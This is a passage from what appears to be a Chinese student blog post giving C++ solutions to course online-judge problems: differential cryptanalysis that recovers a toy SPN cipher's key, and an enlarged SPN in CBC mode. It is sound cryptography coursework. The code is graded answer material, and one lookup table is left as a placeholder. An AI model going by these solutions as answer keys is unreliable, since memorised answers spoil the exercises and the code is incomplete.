class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (times == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, key);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (times == <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (times == <span class="number">2</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="差分分析"><a href="#差分分析" class="headerlink" title="差分分析"></a>差分分析</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/III">oj | 差分分析</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030102909.png" alt="差分分析"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123; &#123; <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span> &#125;, &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> permutation[<span class="number">2</span>][<span class="number">65536</span>] = &#123;打表&#125;;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext, <span class="keyword">unsigned</span> <span class="keyword">int</span> ciphertext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">				plaintext ^= ((k &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				plaintext ^= permutation[mode][(k &gt;&gt; (<span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			plaintext ^= ((k &gt;&gt; (<span class="number">16</span> - <span class="number">4</span> * i)) &amp; <span class="number">0xffff</span>);</span><br><span class="line">		plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] | ((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line">		plaintext = permutation[mode][plaintext];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= permutation[mode][(k &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xffff</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= ((k &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] | ((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) | ((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= ((k &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= (k &amp; <span class="number">0xffff</span>);</span><br><span class="line">	<span class="comment">//printf(&quot;%04x&quot;, plaintext);</span></span><br><span class="line">	<span class="keyword">return</span> (plaintext == ciphertext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> c = <span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">while</span> (c != <span class="string">&#x27; &#x27;</span> &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">		x = x * <span class="number">16</span> + ((c &gt;= <span class="string">&#x27;a&#x27;</span>) ? (c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>) : (c - <span class="string">&#x27;0&#x27;</span>));</span><br><span class="line">		c = <span class="built_in">getchar</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n, maxNum[<span class="number">2</span>];</span><br><span class="line">	pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; count1[<span class="number">256</span>], count2[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> plaintext[<span class="number">65536</span>], ciphertext[<span class="number">65536</span>], temp1[<span class="number">4</span>], temp2[<span class="number">4</span>], k[<span class="number">8</span>], lastKey2, key, times;</span><br><span class="line">	<span class="comment">//freopen(&quot;T3.in&quot;, &quot;r&quot;, stdin);</span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		lastKey2 = <span class="number">-1</span>;</span><br><span class="line">		<span class="built_in">fill</span>(count1, count1 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="built_in">fill</span>(count2, count2 + <span class="number">256</span>, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;(<span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">65536</span>; j++) &#123;</span><br><span class="line">			ciphertext[j] = <span class="built_in">read</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 计算第一条链</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">65536</span>; j += <span class="number">37</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (((ciphertext[j] ^ ciphertext[j ^ <span class="number">0xb00</span>]) &amp; <span class="number">0xf0f0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (k[<span class="number">5</span>] = <span class="number">0</span>; k[<span class="number">5</span>] &lt; <span class="number">16</span>; k[<span class="number">5</span>]++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (k[<span class="number">7</span>] = <span class="number">0</span>; k[<span class="number">7</span>] &lt; <span class="number">16</span>; k[<span class="number">7</span>]++) &#123;</span><br><span class="line">						temp1[<span class="number">1</span>] = ((ciphertext[j] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">						temp1[<span class="number">3</span>] = ((ciphertext[j] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">						temp1[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">1</span>]];</span><br><span class="line">						temp1[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">3</span>]];</span><br><span class="line">						temp2[<span class="number">1</span>] = ((ciphertext[j ^ <span class="number">0xb00</span>] &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>) ^ k[<span class="number">5</span>];</span><br><span class="line">						temp2[<span class="number">3</span>] = ((ciphertext[j ^ <span class="number">0xb00</span>] &amp; <span class="number">0xf</span>) ^ k[<span class="number">7</span>]);</span><br><span class="line">						temp2[<span class="number">1</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">1</span>]];</span><br><span class="line">						temp2[<span class="number">3</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">3</span>]];</span><br><span class="line"></span><br><span class="line">						temp1[<span class="number">1</span>] ^= temp2[<span class="number">1</span>];</span><br><span class="line">						temp1[<span class="number">3</span>] ^= temp2[<span class="number">3</span>];</span><br><span class="line">						<span class="keyword">if</span> (temp1[<span class="number">1</span>] == <span class="number">6</span> &amp;&amp; temp1[<span class="number">3</span>] == <span class="number">6</span>)</span><br><span class="line">							count1[k[<span class="number">5</span>] * <span class="number">16</span> + k[<span class="number">7</span>]].first++;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (((ciphertext[j] ^ ciphertext[j ^ <span class="number">0x50</span>]) &amp; <span class="number">0x0f0f</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">for</span> (k[<span class="number">4</span>] = <span class="number">0</span>; k[<span class="number">4</span>] &lt; <span class="number">16</span>; k[<span class="number">4</span>]++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (k[<span class="number">6</span>] = <span class="number">0</span>; k[<span class="number">6</span>] &lt; <span class="number">16</span>; k[<span class="number">6</span>]++) &#123;</span><br><span class="line">						temp1[<span class="number">0</span>] = ((ciphertext[j] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">						temp1[<span class="number">2</span>] = ((ciphertext[j] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">						temp1[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">0</span>]];</span><br><span class="line">						temp1[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp1[<span class="number">2</span>]];</span><br><span class="line">						temp2[<span class="number">0</span>] = ((ciphertext[j ^ <span class="number">0x50</span>] &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>) ^ k[<span class="number">4</span>];</span><br><span class="line">						temp2[<span class="number">2</span>] = ((ciphertext[j ^ <span class="number">0x50</span>] &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>) ^ k[<span class="number">6</span>];</span><br><span class="line">						temp2[<span class="number">0</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">0</span>]];</span><br><span class="line">						temp2[<span class="number">2</span>] = substitution[<span class="number">1</span>][temp2[<span class="number">2</span>]];</span><br><span class="line"></span><br><span class="line">						temp1[<span class="number">0</span>] ^= temp2[<span class="number">0</span>];</span><br><span class="line">						temp1[<span class="number">2</span>] ^= temp2[<span class="number">2</span>];</span><br><span class="line">						<span class="keyword">if</span> (temp1[<span class="number">0</span>] == <span class="number">5</span> &amp;&amp; temp1[<span class="number">2</span>] == <span class="number">5</span>)</span><br><span class="line">							count2[k[<span class="number">4</span>] * <span class="number">16</span> + k[<span class="number">6</span>]].first++;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 得到部分密钥</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line">			count1[j].second = j;</span><br><span class="line">			count2[j].second = j;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort</span>(count1, count1 + <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sort</span>(count2, count2 + <span class="number">256</span>);</span><br><span class="line">		k[<span class="number">4</span>] = count2[<span class="number">255</span>].second / <span class="number">16</span>;</span><br><span class="line">		k[<span class="number">6</span>] = count2[<span class="number">255</span>].second % <span class="number">16</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">255</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">			k[<span class="number">5</span>] = count1[j].second / <span class="number">16</span>;</span><br><span class="line">			k[<span class="number">7</span>] = count1[j].second % <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (k[<span class="number">0</span>] = <span class="number">0</span>; k[<span class="number">0</span>] &lt; <span class="number">65536</span>; k[<span class="number">0</span>]++) &#123;</span><br><span class="line">				key = (k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) | (k[<span class="number">4</span>] &lt;&lt; <span class="number">12</span>) | (k[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) | (k[<span class="number">6</span>] &lt;&lt; <span class="number">4</span>) | k[<span class="number">7</span>];</span><br><span class="line">				<span class="keyword">for</span> (times = <span class="number">0</span>; times &lt; <span class="number">10</span>; times++) &#123;</span><br><span class="line">					<span class="keyword">if</span> (!<span class="built_in">SPN</span>(key, times * <span class="number">1000</span> + <span class="number">30000</span>, ciphertext[times * <span class="number">1000</span> + <span class="number">30000</span>], <span class="number">0</span>))</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (times == <span class="number">10</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, key);</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (times == <span class="number">10</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="SPN增强"><a href="#SPN增强" class="headerlink" title="SPN增强"></a>SPN增强</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/IV">oj | SPN增强</a></p>
<p>题目要求： <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030103130.png" alt="SPN增强"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPN CBC模式</span></span><br><span class="line"><span class="comment">// SPN分组长度64位  密钥长度128位</span></span><br><span class="line"><span class="comment">// 重写了P盒</span></span><br><span class="line"><span class="comment">// Nr = 4（跑四轮）</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> GCC optimize(<span class="meta-string">&quot;O3&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYBYTES (16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPNBYTES (8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INPUTBYTES (1&lt;&lt;24)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> substitution[<span class="number">2</span>][<span class="number">16</span>] = &#123; &#123; <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span> &#125;, &#123;<span class="number">14</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">5</span>&#125; &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> permutationArr[<span class="number">64</span>];</span><br><span class="line"><span class="keyword">int</span> permutationPos[<span class="number">2</span>][<span class="number">64</span>] = &#123; &#123;<span class="number">0</span>,<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">33</span>,<span class="number">49</span>,<span class="number">2</span>,<span class="number">18</span>,<span class="number">34</span>,<span class="number">50</span>,<span class="number">3</span>,<span class="number">19</span>,<span class="number">35</span>,<span class="number">51</span>,<span class="number">4</span>,<span class="number">20</span>,<span class="number">36</span>,<span class="number">52</span>,<span class="number">5</span>,<span class="number">21</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">38</span>,<span class="number">54</span>,<span class="number">7</span>,<span class="number">23</span>,<span class="number">39</span>,<span class="number">55</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">40</span>,<span class="number">56</span>,<span class="number">9</span>,<span class="number">25</span>,<span class="number">41</span>,<span class="number">57</span>,<span class="number">10</span>,<span class="number">26</span>,<span class="number">42</span>,<span class="number">58</span>,<span class="number">11</span>,<span class="number">27</span>,<span class="number">43</span>,<span class="number">59</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">44</span>,<span class="number">60</span>,<span class="number">13</span>,<span class="number">29</span>,<span class="number">45</span>,<span class="number">61</span>,<span class="number">14</span>,<span class="number">30</span>,<span class="number">46</span>,<span class="number">62</span>,<span class="number">15</span>,<span class="number">31</span>,<span class="number">47</span>,<span class="number">63</span>&#125;,</span><br><span class="line">							&#123;<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">16</span>,<span class="number">20</span>,<span class="number">24</span>,<span class="number">28</span>,<span class="number">32</span>,<span class="number">36</span>,<span class="number">40</span>,<span class="number">44</span>,<span class="number">48</span>,<span class="number">52</span>,<span class="number">56</span>,<span class="number">60</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">21</span>,<span class="number">25</span>,<span class="number">29</span>,<span class="number">33</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">45</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">57</span>,<span class="number">61</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">18</span>,<span class="number">22</span>,<span class="number">26</span>,<span class="number">30</span>,<span class="number">34</span>,<span class="number">38</span>,<span class="number">42</span>,<span class="number">46</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">58</span>,<span class="number">62</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">27</span>,<span class="number">31</span>,<span class="number">35</span>,<span class="number">39</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">63</span>&#125; &#125;;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">permutation</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> plaintext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> mask = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">		permutationArr[i] = ((plaintext &amp; mask) == <span class="number">0</span> ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">		mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	plaintext = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">		plaintext ^= (permutationArr[permutationPos[mode][i]] &lt;&lt; i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> plaintext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="title">SPN</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k[<span class="number">5</span>], <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> plaintext, <span class="keyword">int</span> mode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (mode == <span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">				plaintext ^= k[<span class="number">4</span>];</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				plaintext ^= <span class="built_in">permutation</span>(k[<span class="number">4</span> - i], mode);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			plaintext ^= k[i];</span><br><span class="line">		plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000</span>) &gt;&gt; <span class="number">20</span>]) &lt;&lt; <span class="number">20</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000</span>) &gt;&gt; <span class="number">24</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">28</span>]) &lt;&lt; <span class="number">28</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000</span>) &gt;&gt; <span class="number">32</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000</span>) &gt;&gt; <span class="number">36</span>]) &lt;&lt; <span class="number">36</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000</span>) &gt;&gt; <span class="number">40</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000</span>) &gt;&gt; <span class="number">44</span>]) &lt;&lt; <span class="number">44</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000</span>) &gt;&gt; <span class="number">48</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000000</span>) &gt;&gt; <span class="number">52</span>]) &lt;&lt; <span class="number">52</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000000</span>) &gt;&gt; <span class="number">56</span>]) &lt;&lt; <span class="number">56</span>) |</span><br><span class="line">			((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000000</span>) &gt;&gt; <span class="number">60</span>]) &lt;&lt; <span class="number">60</span>);</span><br><span class="line">		plaintext = <span class="built_in">permutation</span>(plaintext, mode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= <span class="built_in">permutation</span>(k[<span class="number">1</span>], mode);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= k[<span class="number">3</span>];</span><br><span class="line">	plaintext = substitution[mode][plaintext &amp; <span class="number">0xf</span>] |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0</span>) &gt;&gt; <span class="number">4</span>]) &lt;&lt; <span class="number">4</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00</span>) &gt;&gt; <span class="number">8</span>]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000</span>) &gt;&gt; <span class="number">12</span>]) &lt;&lt; <span class="number">12</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>]) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000</span>) &gt;&gt; <span class="number">20</span>]) &lt;&lt; <span class="number">20</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000</span>) &gt;&gt; <span class="number">24</span>]) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000</span>) &gt;&gt; <span class="number">28</span>]) &lt;&lt; <span class="number">28</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000</span>) &gt;&gt; <span class="number">32</span>]) &lt;&lt; <span class="number">32</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000</span>) &gt;&gt; <span class="number">36</span>]) &lt;&lt; <span class="number">36</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000</span>) &gt;&gt; <span class="number">40</span>]) &lt;&lt; <span class="number">40</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000</span>) &gt;&gt; <span class="number">44</span>]) &lt;&lt; <span class="number">44</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000</span>) &gt;&gt; <span class="number">48</span>]) &lt;&lt; <span class="number">48</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf0000000000000</span>) &gt;&gt; <span class="number">52</span>]) &lt;&lt; <span class="number">52</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf00000000000000</span>) &gt;&gt; <span class="number">56</span>]) &lt;&lt; <span class="number">56</span>) |</span><br><span class="line">		((substitution[mode][(plaintext &amp; <span class="number">0xf000000000000000</span>) &gt;&gt; <span class="number">60</span>]) &lt;&lt; <span class="number">60</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == <span class="number">1</span>)</span><br><span class="line">		plaintext ^= k[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		plaintext ^= k[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">return</span> plaintext;</span><br><span 